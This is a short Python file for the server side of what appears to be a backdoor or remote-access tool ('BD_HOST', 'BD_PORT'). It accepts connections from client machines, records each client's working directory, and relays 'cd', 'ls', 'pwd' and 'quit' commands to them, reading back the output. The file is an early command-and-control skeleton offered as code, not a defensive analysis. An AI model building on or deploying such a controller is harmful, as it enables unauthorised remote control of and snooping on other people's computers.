import socket
import os
from threading import Thread

import models

HOST = str(os.environ.get("BD_HOST"))
PORT = int(os.environ.get("BD_PORT"))
server_socket = socket.socket()
server_socket.bind((HOST, PORT))
print('[+] Server Started')
clients = []
server_socket.listen(5)


def send_command(userinput, client):
    input_list = userinput.split(" ")
    command = input_list[0]
    cl = client.socket
    print(command)
    args = input_list.copy()
    output = ""
    del (args[0])
    if command == "quit":
        cl.send(userinput.encode("UTF-8"))
    elif command == 'pwd':
        return client.pwd
    elif command == "cd":
        cl.send(userinput.encode("UTF-8"))
        output = cl.recv(1024).decode()
        print(output)
        if not output == "invalid":
            client.pwd = output
    elif command == "ls":
        cl.send(userinput.encode("UTF-8"))
        output = cl.recv(1024)
        output = output.decode()
    return output


def listen_for_clients():
    print("[+] Listening for Connections!")
    while True:
        client, client_addr = server_socket.accept()
        print(f'[+] {client_addr} Client connected to the server')
        pwd = client.recv(1024).decode()
        c = models.Client(pwd, client_addr, client)
        clients.append(c)
